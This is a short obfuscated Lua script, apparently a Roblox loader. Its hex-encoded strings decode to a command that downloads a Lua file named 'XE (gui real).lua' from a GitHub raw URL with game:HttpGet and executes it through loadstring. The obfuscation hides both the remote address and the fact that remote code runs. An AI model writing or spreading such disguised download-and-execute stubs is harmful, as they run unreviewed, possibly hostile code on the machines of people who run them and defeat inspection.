-- obfuscated by Axvv / obfuscator (hex + load)
-- original size: 139 bytes
local h={"6c6f6164737472696e672867616d653a48747470476574282268747470733a2f2f7261772e676974","68756275736572636f6e74656e742e636f6d2f61676e6f7269736d616a6c693131312d6465627567","2f58452d4f46462d4755492d484f4c592f726566732f68656164732f6d61696e2f58452532302867","75692532307265616c292e6c75612229292829"}
local s=table.concat(h)
local b=s:gsub('..',function(c)return string.char(tonumber(c,16))end)
local f=loadstring or load
local fn=f(b)
if fn then fn() else error('obfuscated chunk failed to load') end
